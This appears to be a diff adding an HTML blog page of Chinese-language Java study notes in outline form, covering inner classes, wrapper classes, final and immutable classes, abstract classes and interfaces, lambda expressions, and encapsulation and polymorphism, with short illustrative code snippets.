+<li><p>在创建非静态内部类的子类实例时，需要确保父类内部类的构造器可以被调用，这要求外部类对象必须存在</p>
+</li>
+<li><p>如果有一个非静态内部类的子类对象存在，则一定存在一个对应的外部类对象</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>在外部类以外使用静态内部类</p>
+<ul>
+<li><p>OuterClass.StaticInnerClass obj = new OuterClass.StaticInnerClass();</p>
+</li>
+<li><p>创建内部类对象时，静态<br>内部类只需使用外部类即可调用构造器，而非静态内部类必须使用外<br>部类对象来调用构造器</p>
+</li>
+<li><p>相比之下，使用静态内部类比使用非静态内部类要简单很多，<br>只要把外部类当成静态内部类的包空间即可。因此当程序需要使用<br>内部类时，应该优先考虑使用静态内部类</p>
+</li>
+<li><p>内部类的类名不再是简单地由内<br>部类的类名组成，它实际上还把外部类的类名作为一个命名空间，作<br>为内部类类名的限制。因此子类中的内部类和父类中的内部类不能<br>完全同名，即使二者所包含的内部类的类名相同，但因为它们所处的<br>外部类空间不同，所以它们不可能完全同名，也就不可能重写。</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>局部内部类</p>
+<ul>
+<li><p>作用范围仅限于包含它的方法内部，在方法的外部无法使用它。由于其作用范围的限制，局部内部类不能使用访问控制符或 static 修饰符</p>
+</li>
+<li><p>作用域限制</p>
+<ul>
+<li>生命周期仅限于方法的调用和执行过程。</li>
+</ul>
+</li>
+<li><p>局部内部类因其局部性质，在实际开发中很少被使用。由于其作用域限制，无法离开定义它的方法，因此大部分情况下，定义一个类后希望该类能够被多次复用，而局部内部类无法满足这种需求</p>
+</li>
+<li><p>局部内部类的class文件<br>总是遵循如下命名格式：OuterClass$NInnerClass.class</p>
+<ul>
+<li><p>N是一个数字，表示不同方法中的局部内部类</p>
+</li>
+<li><p>同一个类里不可能有两个同名的成员内部类，但在同一个类里可以有两个以上同名的局部内部类（位于不同方法中）</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>匿名内部类</p>
+<ul>
+<li><p>new 实现接口（ ）或 父类构造器（实参列表）<br>{<br>//匿名内部类的类体部分<br>}</p>
+<ul>
+<li>通常用于一次性的类实例创建<br>但由于其局限性，不适用于需要多次复用的情况</li>
+</ul>
+</li>
+<li><p>匿名内部类必须继承一个父类或实现一个接口，但最多只能继承一个父类或实现一个接口</p>
+</li>
+<li><p>规则限制</p>
+<ul>
+<li><p>匿名内部类不能是抽象类，因为它会立即创建匿名内部类的对象</p>
+</li>
+<li><p>匿名内部类不能定义构造器，但可以使用实例初始化块来完成构造器的功能</p>
+</li>
+</ul>
+</li>
+<li><p>实现接口的匿名内部类</p>
+<ul>
+<li><p>匿名内部类可以实现接口并且可以重写接口中的方法</p>
+</li>
+<li><p>对于接口的匿名内部类，不能显式定义构造器，只能通过无参构造器创建实例</p>
+</li>
+</ul>
+</li>
+<li><p>继承父类的匿名内部类</p>
+<ul>
+<li><p>匿名内部类可以继承一个父类并重写父类中的方法</p>
+</li>
+<li><p>对于继承父类的匿名内部类，可以有和父类相似的构造器，根据需要传入参数或不传参数</p>
+</li>
+</ul>
+</li>
+<li><p>从Java 8开始，被匿名内部类访问的局部变量可以被隐式视为 final，但不能重新赋值</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>包装类（Wrapper Class）</p>
+<ul>
+<li><p>Java中一组用于包装基本数据类型的类，这些基本数据类型包括整数、浮点数、字符、布尔值等。包装类的主要作用是将基本数据类型转换为对象</p>
+</li>
+<li><p>可以直接将基本数据类型赋给包装类<br>必须注意类型匹配，Java会自动进行转换</p>
+<ul>
+<li><p>自动装箱（Autoboxing）</p>
+<ul>
+<li>把一个基本类型变量直接赋给对应的包装类变量，或者赋给Object变量（Object是所有类的父类，子类对象可以直接赋给父类变量）</li>
+</ul>
+</li>
+<li><p>自动拆箱（AutoUnboxing）</p>
+<ul>
+<li><p>允许直接把包装类对象直<br>接赋给一个对应的基本类型变量</p>
+</li>
+<li><p>比较包装类实例与数值类型的值</p>
+<ul>
+<li>Integer num = 42;  // 创建一个Integer对象<br>int value = 42;    // 创建一个int值</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>if (num == value) {<br>    System.out.println(“相等”);<br>} else {<br>    System.out.println(“不相等”);<br>}</p>
+<pre><code>- 实现基本类型变量和字符串之间的转换
+
+    - 利用包装类提供的parseXxx(String s)静态方法
+</code></pre><p>（ 除Character之外的所有包装类都提供了该方法）</p>
+<pre><code>        - String str = &quot;123&quot;;
+</code></pre><p>int num = Integer.parseInt(str);<br>将字符串转换为整数类型</p>
+<pre><code>    - 利用包装类提供的valueOf(String s)静态方法
+
+        - String str = &quot;123&quot;;
+</code></pre><p>Integer num = Integer.valueOf(str);<br>将字符串转换为 Integer 对象</p>
+<pre><code>    - 整数隐式转换为字符串
+
+        - int number = 42;
+</code></pre><p>String str = number + “”;  // 将int转换为字符串</p>
+<ul>
+<li><p>单例类（Singleton）</p>
+<ul>
+<li><p>一个类始终只能创建一个实例，则这个类被称为单例类</p>
+<ul>
+<li><p>将类的构造器私有化，以防止外部类创建对象</p>
+</li>
+<li><p>提供一个public静态方法作为该类的访问点，在这个方法中创建实例对象</p>
+<ul>
+<li>只能通过 Singleton.getInstance() 方法来获取单例对象</li>
+</ul>
+</li>
+<li><p>使用一个静态变量来缓存已创建的对象，确保每次调用 getInstance() 方法时都返回相同的实例</p>
+</li>
+<li><p>必须缓存已经创建的对象，否则该类无法知道<br>是否曾经创建过对象，也就无法保证只创建一个对象</p>
+<ul>
+<li>需要<br>使用一个成员变量来保存曾经创建的对象，因为该成员变量需要被上<br>面的静态方法访问，故该成员变量必须使用static修饰</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>final修饰符</p>
+<ul>
+<li><p>定义</p>
+<ul>
+<li><p>既可以修饰成员变量（包括类变量和实例变量），也可以修饰局<br>部变量、形参</p>
+<ul>
+<li><p>➢ 类变量：必须在静态初始化块中指定初始值或声明该类变量时<br>指定初始值，而且只能在两个地方的其中之一指定</p>
+</li>
+<li><p>➢ 实例变量：必须在非静态初始化块、声明该实例变量或构造器<br>中指定初始值，而且只能在三个地方的其中之一指定</p>
+</li>
+</ul>
+</li>
+<li><p>final修饰的变量不可被改变，一旦获得<br>了初始值，该final变量的值就不能被重新赋值</p>
+</li>
+<li><p>final修饰的成员变量必须<br>由程序员显式地指定初始值<br>对于final成员变<br>量，程序当然希望总是能访问到它固定的、显式初始化的值</p>
+</li>
+<li><p>final 成员变量必须在对象构造过程中确保被初始化。如果在构造器、初始化块中对 final 成员变量进行初始化，确保在使用之前初始化，否则会出现默认初始化的情况</p>
+</li>
+</ul>
+</li>
+<li><p>final局部变量</p>
+<ul>
+<li>如果final修饰的局部变量在定义时没有指定默认值，则可以在后<br>面代码中对该final变量赋初始值，但只能一次，不能重复赋值</li>
+</ul>
+</li>
+<li><p>final只保证这个引用类型变量所引用的地址不会改变，即一直引用同一个对象，但这个对象完全可以发生改变</p>
+</li>
+<li><p>可执行“宏替换”的final变量</p>
+<ul>
+<li>定义一个final变量并在声明时指定一个编译时确定的初始值，编译器在编译时将使用宏变量的地方直接替换为其值，以提高性能和减少代码的复杂性</li>
+</ul>
+</li>
+<li><p>当一个变量满足下面三个条件时，它被认为是一个常量（constant）或直接量（literal）</p>
+<ul>
+<li><p>➢ 使用final修饰符修饰。</p>
+</li>
+<li><p>➢ 在定义该final变量时指定了初始值。</p>
+</li>
+<li><p>➢ 该初始值可以在编译时就被确定下来。</p>
+</li>
+</ul>
+</li>
+<li><p>Java会使用常量池来管理曾经用过的字符串直接量，例如执行var a=”java”；语句之后，常量池中就会缓存一个字符串”java”；如果程序再次执行var b=”java”;，系统将会让b直接指向常量池中的”java”字符串，因此a==b将会返回true</p>
+</li>
+<li><p>final方法</p>
+<ul>
+<li>final修饰的方法不可被重写</li>
+</ul>
+</li>
+<li><p>final类</p>
+<ul>
+<li>final修饰的类不可以有子类</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>不可变类</p>
+<ul>
+<li><p>创建该类的实例后，该实例的实例变量是不可改变的</p>
+</li>
+<li><p>创建自定义的不可变类</p>
+<ul>
+<li><p>➢ 使用private和final修饰符来修饰该类的成员变量。</p>
+</li>
+<li><p>➢ 提供带参数的构造器（或返回该实例的类方法），用于根据传入参数来初始化类里的成员变量。</p>
+</li>
+<li><p>➢ 仅为该类的成员变量提供getter方法，不要为该类的成员变量提供setter方法，因为普通方法无法修改final修饰的成员变量</p>
+</li>
+<li><p>如果有必要，重写Object类的hashCode()和equals()方法<br>equals()方法根据<br>关键成员变量来作为两个对象是否相等的标准，除此之外，还<br>应该保证两个用equals()方法判断为相等的对象的hashCode()<br>也相等</p>
+</li>
+</ul>
+</li>
+<li><p>缓存实例的不可变类</p>
+<ul>
+<li><p>缓存实现</p>
+<ul>
+<li><p>使用valueOf()方法生成对象，系统是否重新生成新对象取决于缓存池中是否已经存在相同对象</p>
+</li>
+<li><p>private修饰符隐藏构造器，程序只能通过提供的valueOf()方法来获取实例</p>
+</li>
+</ul>
+</li>
+<li><p>先进先出（FIFO）规则</p>
+<ul>
+<li>当缓存池已满时，最先进入缓存的对象会被最先移除，而最后进入缓存的对象会被保留</li>
+</ul>
+</li>
+<li><p>是否隐藏构造器</p>
+<ul>
+<li><p>需要控制对象创建</p>
+</li>
+<li><p>需要维护缓存</p>
+<ul>
+<li>计划在类内部使用缓存来管理对象实例，那么通常需要隐藏构造器，以确保所有对象都经过缓存池的管理</li>
+</ul>
+</li>
+<li><p>控制不可变性</p>
+<ul>
+<li>隐藏构造器可以确保在对象创建后不再被修改</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>计划在类内部使用缓存来管理对象实例，那么通常需要隐藏构造器，以确保所有对象都经过缓存池的管理</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>接口和抽象类</p>
+<ul>
+<li><p>抽象类</p>
+<ul>
+<li><p>抽象方法和抽象类必须使用abstract修饰符来定义，有抽象方法<br>的类只能被定义成抽象类，抽象类里可以没有抽象方法</p>
+</li>
+<li><p>规则“有得有失”</p>
+<ul>
+<li><p>抽象方法没有方法体</p>
+<ul>
+<li>public<br>abstract void test()没有一对花括号</li>
+</ul>
+</li>
+<li><p>抽象类不能被实例化，它存在主要是为了被继承。即使抽象类没有抽象方法，也不能创建实例</p>
+</li>
+<li><p>抽象类可以包含成员变量、方法（普通方法和抽象方法）、构造器、初始化块、内部类（接口、枚举）</p>
+</li>
+<li><p>抽<br>象类的构造器不能用于创建实例，主要是用于被其子类调用</p>
+</li>
+<li><p>一个类如果包含抽象方法（直接定义、继承抽象父类但没有实现父类的抽象方法、或者实现接口但没有完全实现接口的抽象方法），那么该类必须声明为抽象类，除非它的子类提供了具体的实现</p>
+</li>
+</ul>
+</li>
+<li><p>abstract关键字</p>
+<ul>
+<li><p>abstract关键字修饰的方法必须被其子类重写才有意义，否则<br>这个方法将永远不会有方法体，因此abstract方法不能定义为<br>private访问权限，即private和abstract不能同时修饰方法</p>
+</li>
+<li><p>abstract不能用于修饰成员变量，不能用于修饰局部变量，即<br>没有抽象变量、没有抽象成员变量等说法；abstract也不能用于修<br>饰构造器，没有抽象构造器，抽象类里定义的构造器只能是普通构<br>造器</p>
+</li>
+<li><p>static和abstract并不是绝对互斥的，static和abstract虽然<br>不能同时修饰某个方法，但它们可以同时修饰内部类</p>
+</li>
+</ul>
+</li>
+<li><p>模板模式</p>
+<ul>
+<li>有助于提供通用的框架，同时允许不同的子类提供各自的实现</li>
+</ul>
+</li>
+<li><p>抽象类的作用</p>
+<ul>
+<li><p>模板模式</p>
+<ul>
+<li><p>➢ 抽象父类可以只定义需要使用的某些方法，把不能实现的部分抽象成抽象方法，留给其子类去实现。</p>
+</li>
+<li><p>➢ 父类中可能包含需要调用其他系列方法的方法，这些被调方法既可以由父类实现，也可以由其子类实现。父类里提供的方法只是定义了一个通用算法，其实现也许并不完全由自身实现，而必须依赖于其子类的辅助</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>接口</p>
+<ul>
+<li><p>接口是从多个相似类中抽象出来的规范，接口不提供任何实现。接口体现的是规范和实现分离的设计哲学</p>
+</li>
+<li><p>一个Java<br>源文件里最多只能有一个public接口，如果一个Java源文件里定义<br>了一个public接口，则该源文件的主文件名必须与该接口名相同</p>
+</li>
+<li><p>[修饰符] interface 接口名 extends 父接口1， 父接口2…<br>{<br>零个到多个常量定义（只能是静态常量）<br>零个到多个抽象方法定义<br>（只<br>能是抽象实例方法、类方法、默认方法或私有方法）<br>零个到多个内部类、接口、枚举定义<br>零个到多个私有方法、默认方法或类方法定义<br>接口里不能包含构造器和初始<br>化块定义<br>}</p>
+<ul>
+<li><p>修饰符可以是public或者省略，如果省略了public访问控制<br>符，则默认采用包权限访问控制符，即只有在相同包结构下才<br>可以访问该接口</p>
+</li>
+<li><p>接口名应与类名采用相同的命名规则</p>
+</li>
+<li><p>一个接口可以有多个直接父接口，但接口只能继承接口，不能<br>继承类</p>
+</li>
+<li><p>接口里的常量、方法、内部类和内部枚举都是public访问权限</p>
+</li>
+</ul>
+</li>
+<li><p>私有方法</p>
+<ul>
+<li><p>在接口内部定义私有方法，这些方法只能被接口中的其他默认方法或静态方法所使用，而无法被接口的实现类直接调用</p>
+</li>
+<li><p>作为工具方法，为接口中的默认方法或类方法提供支持</p>
+<ul>
+<li>用于在接口内部共享代码逻辑</li>
+</ul>
+</li>
+<li><p>私有<br>方法可以拥有方法体，但私有方法不能使用default修饰。私有方法可<br>以使用static修饰，也就是说，私有方法既可是类方法，也可是实例<br>方法</p>
+</li>
+</ul>
+</li>
+<li><p>静态常量</p>
+<ul>
+<li>在<br>接口中定义成员变量时，不管是否使用public static final修饰符，<br>接口里的成员变量总是使用这三个修饰符来修饰</li>
+</ul>
+</li>
+<li><p>在接口中定义的</p>
+<ul>
+<li><p>内部类、内部接口、内部枚举，默认都采用public<br>static两个修饰符</p>
+</li>
+<li><p>方法，只能是抽象方法、类方法、默认方法或私有方<br>法，自动为<br>普通方法增加abstract修饰符</p>
+<ul>
+<li><p>类方法、默认方法、私有方法都必须有方法实现（方法体）</p>
+<ul>
+<li>默认方法就是有方法体的实例方法</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>普通方法，接口里的普通方法总是使用public<br>abstract来修饰</p>
+<ul>
+<li>接口里的普通方法不能有方法实现（方法体）</li>
+</ul>
+</li>
+<li><p>成员变量，不管是否使用public static final修饰符，<br>接口里的成员变量总是使用这三个修饰符来修饰</p>
+</li>
+</ul>
+</li>
+<li><p>完全支持多继承</p>
+<ul>
+<li><p>子接口扩展某个父接口，将<br>会获得父接口里定义的所有抽象方法、常量</p>
+</li>
+<li><p>子接口可以通过使用 extends 关键字继承多个父接口</p>
+</li>
+</ul>
+</li>
+<li><p>使用接口</p>
+<ul>
+<li><p>主要用途</p>
+<ul>
+<li><p>➢ 定义变量，也可用于进行强制类型转换。</p>
+</li>
+<li><p>➢ 调用接口中定义的常量。</p>
+</li>
+<li><p>➢ 被其他类实现。</p>
+</li>
+</ul>
+</li>
+<li><p>类实现接口</p>
+<ul>
+<li><p>弥补单继承的不足</p>
+</li>
+<li><p>implements关键字</p>
+<ul>
+<li>继承使用extends关键字，实现<br>则使用implements关键字</li>
+</ul>
+</li>
+<li><p>public class MyClass extends 父类 implements Interface1, Interface2, Interface3 {<br>// 类的实现<br>}</p>
+</li>
+<li><p>一个类实现了一个或多个接口之后，这个类必须完全实现这些接<br>口里所定义的全部抽象方法（也就是重写这些抽象方法）；否则，该<br>类将保留从父接口那里继承到的抽象方法，该类也必须定义成抽象<br>类</p>
+</li>
+<li><p>实现接口方法时，必须使用 public 访问修饰符。因为子类（或者实现类）重写父类的方法时，访问权限只能更大或相等，所以实现类实现接口方法时只能使用 public 访问权限</p>
+</li>
+<li><p>接口不能显式继承任何类，但所有接口类型的引用变量都可以直<br>接赋给Object类型的引用变量</p>
+</li>
+<li><p>Java 中所有对象最终都是 Object 类的子类。当一个类实现了接口，这个类的实例本质上是 Object 类的子类，因为 Object 类是Java类层级结构的根类</p>
+</li>
+</ul>
+</li>
+<li><p>接口内部可以嵌套其他接口。默认情况下，接口内部的接口自动具有 public 和 static 两个修饰符。这表示内部接口默认是静态的，可以直接通过外部接口名访问，并且也是公开可访问的</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>接口和抽象类</p>
+<ul>
+<li><p>接口：作为系统与外界交互的规范，规定了实现者必须向外提供哪些服务（方法），以及调用者可以如何调用这些服务。在程序中使用接口时，它是多个模块间的耦合标准。在多个应用程序之间使用接口时，它是多个程序之间的通信标准。接口类似于整个系统的“总纲”，制定了系统各模块应该遵循的标准。因此，一旦接口被改变，对整个系统或其他系统的影响将是辐射式的，可能导致系统中大部分类都需要修改</p>
+</li>
+<li><p>抽象类：作为系统中多个子类的共同父类，体现了一种模板式设计。抽象类是系统实现过程中的中间产品，它已经实现了系统的部分功能（那些已提供实现的方法）。然而，这个中间产品依然不能作为最终产品，需要有进一步的完善</p>
+</li>
+<li><p>相同</p>
+<ul>
+<li><p>➢ 接口和抽象类都不能被实例化，它们都位于继承树的顶端，用<br>于被其他类实现和继承</p>
+</li>
+<li><p>➢ 接口和抽象类都可以包含抽象方法，实现接口或继承抽象类的<br>普通子类都必须实现这些抽象方法</p>
+</li>
+</ul>
+</li>
+<li><p>差别</p>
+<ul>
+<li><p>➢ 接口里只能包含抽象方法、静态方法、默认方法和私有方法，不能为普通方法提供方法实现；抽象类则完全可以包含普通方法</p>
+</li>
+<li><p>➢ 接口里只能定义静态常量，不能定义普通成员变量；抽象类里则既可以定义普通成员变量，也可以定义静态常量。</p>
+</li>
+<li><p>➢ 接口里不包含构造器；抽象类里可以包含构造器，抽象类里的构造器并不是用于创建对象，而是让其子类调用这些构造器来完成属于抽象类的初始化操作。</p>
+</li>
+<li><p>➢ 接口里不能包含初始化块；但抽象类则完全可以包含初始化块</p>
+</li>
+<li><p>➢ 一个类最多只能有一个直接父类，包括抽象类；但一个类可以直接实现多个接口，通过实现多个接口可以弥补Java单继承的不足</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="Lambda表达式"><a href="#Lambda表达式" class="headerlink" title="Lambda表达式"></a>Lambda表达式</h2><h3 id="Lambda表达式基本结构"><a href="#Lambda表达式基本结构" class="headerlink" title="Lambda表达式基本结构"></a>Lambda表达式基本结构</h3><ul>
+<li><p>形参列表： 允许省略类型，如果只有一个参数可以省略括号</p>
+</li>
+<li><p>箭头符号 -&gt;：将参数列表与Lambda表达式的主体分隔开</p>
+</li>
+<li><p>主体： 包含Lambda表达式要执行的语句</p>
+</li>
+<li><p>如果Lambda表达式只有一个语句，可以省略花括号 {}</p>
+</li>
+<li><p>如果Lambda表达式只包含一条返回语句，可以省略 return 关键字<br>Lambda表达式需要返回值，而它的代码块中仅有一条<br>省略了return的语句，Lambda表达式会自动返回这条语句的<br>值</p>
+</li>
+<li><p>Eatable eat = () -&gt; System.out.println(“Eating”);  // 一个没有参数的Lambda表达式<br>eat.eat();</p>
+</li>
+</ul>
+<p>Flyable fly = distance -&gt; System.out.println(“Flying “ + distance + “ miles”);  // 一个带有一个参数的Lambda表达式<br>fly.fly(1000);</p>
+<p>Addable add = (a, b) -&gt; a + b;  // 一个带有两个参数的Lambda表达式<br>System.out.println(add.add(5, 3));</p>
+<h3 id="Lambda表达式与函数式接口"><a href="#Lambda表达式与函数式接口" class="headerlink" title="Lambda表达式与函数式接口"></a>Lambda表达式与函数式接口</h3><ul>
+<li><p>特点</p>
+<ul>
+<li><p>目标类型：Lambda 表达式的类型，也就是它的目标类型，必须是函数式接口</p>
+</li>
+<li><p>函数式接口：函数式接口代表只有一个抽象方法的接口。Lambda 表达式实现的是这个唯一的抽象方法</p>
+</li>
+<li><p>@FunctionalInterface注解：这个注解放在接口定义前，用于告诉编译器该接口必须是函数式接口。如果接口不符合函数式接口的条件，编译器会报错</p>
+</li>
+</ul>
+</li>
+<li><p>限制</p>
+<ul>
+<li><p>➢ Lambda表达式的目标类型必须是明确的函数式接口</p>
+</li>
+<li><p>➢ Lambda表达式只能为函数式接口创建对象。Lambda表达式只能<br>实现一个方法，因此它只能为只有一个抽象方法的接口（函数<br>式接口）创建对象</p>
+</li>
+</ul>
+</li>
+<li><p>确保 Lambda 表达式的目标类型是函数式接口</p>
+<ul>
+<li>➢ 将Lambda表达式赋值给函数式接口类型的变量<br>Runnable r = () -&gt; System.out.println(“Running…”);</li>
+</ul>
+</li>
+</ul>
+<pre><code>- ➢ 将Lambda表达式作为函数式接口类型的参数传给某个方法
+</code></pre><p>public void execute(Runnable r) {<br>    r.run();<br>}</p>
+<p>execute(() -&gt; System.out.println(“Executing…”));</p>
+<pre><code>- ➢ 使用函数式接口对Lambda表达式进行强制类型转换
+</code></pre><p>Object obj = (Runnable)() -&gt; System.out.println(“Converting to Runnable…”);</p>
+<ul>
+<li><p>java.util.function包下预定义了大量函数式接口</p>
+<ul>
+<li>➢ XxxFunction：这类接口中通常包含一个apply()抽象方法，该<br>方法对参数进行处理、转换（apply()方法的处理逻辑由Lambda<br>表达式来实现），然后返回一个新的值。该函数式接口通常用<br>于对指定数据进行转换处理。<br>➢ XxxConsumer：这类接口中通常包含一个accept()抽象方法，<br>该方法与XxxFunction接口中的apply()方法基本相似，也负责<br>对参数进行处理，只是该方法不会返回处理结果。<br>➢ XxxxPredicate：这类接口中通常包含一个test()抽象方法，<br>该方法通常用来对参数进行某种判断（test()方法的判断逻辑<br>由Lambda表达式来实现），然后返回一个boolean值。该接口通<br>常用于判断参数是否满足特定条件，经常用于进行筛滤数据<br>➢ XxxSupplier：这类接口中通常包含一个getAsXxx()抽象方<br>法 ， 该 方 法 不 需 要 输 入 参数 ，该方法会按某种逻辑算法<br>（getAsXxx ()方法的逻辑算法由Lambda表达式来实现）返回一<br>个数据</li>
+</ul>
+</li>
+</ul>
+<h3 id="在Lambda表达式中使用var"><a href="#在Lambda表达式中使用var" class="headerlink" title="在Lambda表达式中使用var"></a>在Lambda表达式中使用var</h3><ul>
+<li><p>Predicate<String> myLambda = (String str) -&gt; str.length() &gt; 5;<br>必须明确指定Lambda表达式的目标类型</p>
+<ul>
+<li>BiFunction<Integer, Integer, Integer> adder = (@Nonnull Integer a, @Nonnull Integer b) -&gt; a + b;<br>不<br>能省略Lambda表达式的形参类型—因为注解只能被放在形参类型之<br>前</li>
+</ul>
+</li>
+</ul>
+<h3 id="方法引用与构造器引用"><a href="#方法引用与构造器引用" class="headerlink" title="方法引用与构造器引用"></a>方法引用与构造器引用</h3><ul>
+<li><ul>
+<li><p>方法引用的格式为 ClassName::methodName</p>
+<ul>
+<li><p>引用类方法</p>
+<ul>
+<li>在Lambda表达式中使用类的静态方法Integer::parseInt</li>
+</ul>
+</li>
+<li><p>引用特定对象的实例方法</p>
+<ul>
+<li>允许将特定对象的方法作为Lambda表达式的参数传递<br>object::methodName</li>
+</ul>
+</li>
+<li><p>引用某类对象的实例方法</p>
+<ul>
+<li>Lambda表达式提供的参数是用于调用方法的对象<br>String::substring</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>构造器引用可以用于创建对象，语法是 ClassName::new</p>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="与匿名内部类的联系和区别"><a href="#与匿名内部类的联系和区别" class="headerlink" title="与匿名内部类的联系和区别"></a>与匿名内部类的联系和区别</h3><ul>
+<li><p>访问变量：两者都可以直接访问外部的局部变量，但这些变量必须是 effectively final(实质上是 final 的，即一旦赋值就不会再被修改)</p>
+</li>
+<li><p>默认方法：Lambda表达式和匿名内部类都可以直接调用从接口中继承的默认方法</p>
+</li>
+<li><p>区别</p>
+<ul>
+<li><p>适用范围</p>
+<ul>
+<li><p>Lambda表达式只适用于函数式接口，即接口中只包含一个抽象方法的接口</p>
+</li>
+<li><p>匿名内部类可以为任意接口创建实例，无论接口中有多少个抽象方法</p>
+</li>
+</ul>
+</li>
+<li><p>对默认方法的访问</p>
+<ul>
+<li><p>匿名内部类可以在实现抽象方法的方法体中调用接口中定义的默认方法</p>
+</li>
+<li><p>Lambda表达式的代码块不允许直接调用接口中的默认方法</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="使用Lambda表达式调用Arrays的类方法"><a href="#使用Lambda表达式调用Arrays的类方法" class="headerlink" title="使用Lambda表达式调用Arrays的类方法"></a>使用Lambda表达式调用Arrays的类方法</h3><h2 id="面向接口编程"><a href="#面向接口编程" class="headerlink" title="面向接口编程"></a>面向接口编程</h2><h3 id="简单工厂模式"><a href="#简单工厂模式" class="headerlink" title="简单工厂模式"></a>简单工厂模式</h3><ul>
+<li>对创建对象过程的封装。通过简单工厂，可以将对象的创建逻辑集中管理，提高系统的灵活性</li>
+</ul>
+<h3 id="命令模式"><a href="#命令模式" class="headerlink" title="命令模式"></a>命令模式</h3><ul>
+<li><p>使用一个Command接口来定义一个方法，用这个方法来封<br>装“处理行为”</p>
+<ul>
+<li>public interface Command<br>{<br>//接口里定义的process方法用于封装“处理行为”<br>void process(int element);<br>}</li>
+</ul>
+</li>
+</ul>
+<h2 id="三大特征"><a href="#三大特征" class="headerlink" title="三大特征"></a>三大特征</h2><h3 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h3><ul>
+<li><p>目的</p>
+<ul>
+<li><p>隐藏类的实现细节</p>
+</li>
+<li><p>通过事先预定的方法来访问数据，在方法里加入控制逻辑，限制对成员变量的不合理访问</p>
+</li>
+<li><p>可进行数据检查，有利于保证对象信息的完整性</p>
+</li>
+<li><p>便于修改，提高代码的可维护性</p>
+</li>
+</ul>
+</li>
+<li><p>隐藏和封装</p>
+<ul>
+<li><p>将对象的成员变量和实现细节隐藏起来，不允许外部直接访问</p>
+</li>
+<li><p>把方法暴露出来，让方法来控制对这些成员变量进行安全的访问和操作</p>
+</li>
+</ul>
+</li>
+<li><ul>
+<li><p>private（当前类访问权限）：只能在当前类的内部被访问</p>
+</li>
+<li><p>default（包访问权限）：不使用任何访问控制符<br>修饰<br>访问控制的成员或外部<br>类可以被相同包下的其他类访问</p>
+</li>
+<li><p>protected（子类访问权限）：那么这<br>个成员既可以被同一个包中的其他类访问，也可以被不同包中<br>的子类访问，通常是希望其子类来重写这个方法。</p>
+</li>
+<li><p>public（公共访问权限）：如果一个成员（包括成员变量、方法和构造器等）或者一个外<br>部类使用public访问控制符修饰，那么这个成员或外部类就可<br>以被所有类访问</p>
+</li>
+</ul>
+</li>
+<li><p>访问控制符的使用</p>
+<ul>
+<li><p>类里的绝大部分成员变量都应该使用private修饰，只有一些<br>static修饰的、类似全局变量的成员变量，才可能考虑使用<br>public修饰。</p>
+</li>
+<li><p>有些方法只用于辅助实现该类的其他<br>方法，这些方法被称为工具方法，工具方法也应该使用private<br>修饰。</p>
+</li>
+<li><p>如果某个类主要用做其他类的父类，该类里包含的大部分方法<br>可能仅希望被其子类重写，而不想被外界直接调用，则应该使<br>用protected修饰这些方法</p>
+</li>
+<li><p>希望暴露出来给其他类自由调用的方法应该使用public修饰。</p>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="多态（Polymorphism）"><a href="#多态（Polymorphism）" class="headerlink" title="多态（Polymorphism）"></a>多态（Polymorphism）</h3><ul>
+<li><p>相同类型的变量、<br>调用同一个方法时呈现出多种不同的行为特征</p>
+</li>
+<li><p>引用变量在编译阶段只能调用其编译时类型所具有的方法，但<br>运行时则执行它运行时类型所具有的方法</p>
+<ul>
+<li>引用变量只能调用声明该变量时所用类里包含的方法。例如，<br>通过Object p=new Person()代码定义一个变量p，则这个p只能调用<br>Object类的方法，而不能调用Person类里定义的方法。</li>
+</ul>
+</li>
+</ul>
+<pre><code>- 通过引用变量来访问其包含的实例变量时，系统总是试图访问
+</code></pre><p>它编译时类型所定义的成员变量，而不是它运行时类型所定义的成<br>员变量。</p>
+<ul>
+<li><p>方法重写（override）</p>
+<ul>
+<li><p>子类中定义一个与父类中已有的方法名称、参数列表和返回类型相同的方法。子类方法的实现将替代父类方法的实现。方法重写必须保持方法签名的一致性，包括方法名称、参数列表和返回类型。</p>
+</li>
+<li><p>使用 @Override 注解来标记重写方法</p>
+</li>
+<li><p>动态绑定，指的是在运行时，根据对象的实际类型来确定要调用的方法实现。这允许在父类引用对象的情况下调用子类的方法，实现多态性</p>
+</li>
+</ul>
+</li>
+<li><p>向上转型</p>
+<ul>
+<li>Java允许将子类对象直接赋给父类引用变量，无需任何显式类型转换。这个过程被称为向上转型（Upcasting），向上转型由系统自动完成</li>
+</ul>
+</li>
+<li><p>引用变量的强制类型转换</p>
+<ul>
+<li><p>类型转换运算符是小括号，类型转换运算符的用 法是：<br>(type)variable，这种用法可以将variable变量转换成一个type类型<br>的变量</p>
+</li>
+<li><p>类型转换运算符还可以将一个引用类型变量转换<br>成其子类类型</p>
+<ul>
+<li><p>基本类型之间的转换只能在数值类型之间进行，数值类型和布尔类型<br>之间不能进行类型转换。</p>
+</li>
+<li><p>引用类型之间的转换只能在具有继承关系的两个类型之间进<br>行，如果是两个没有任何继承关系的类型，则无法进行类型转<br>换，否则编译时就会出现错误。</p>
+</li>
+<li><p>如果试图把一个父类实例转换<br>成子类类型，则这个对象必须实际上是子类实例才行（即编译<br>时类型为父类类型，而运行时类型是子类类型），否则将在运<br>行时引发ClassCastException异常。</p>
+</li>
+<li><p>对象 ’instanceof‘ 类型（返回布尔值）<br>instanceof运算符通常用于在进行向下转型之前检查对象的类型，以确保转型是安全的。</p>
+<ul>
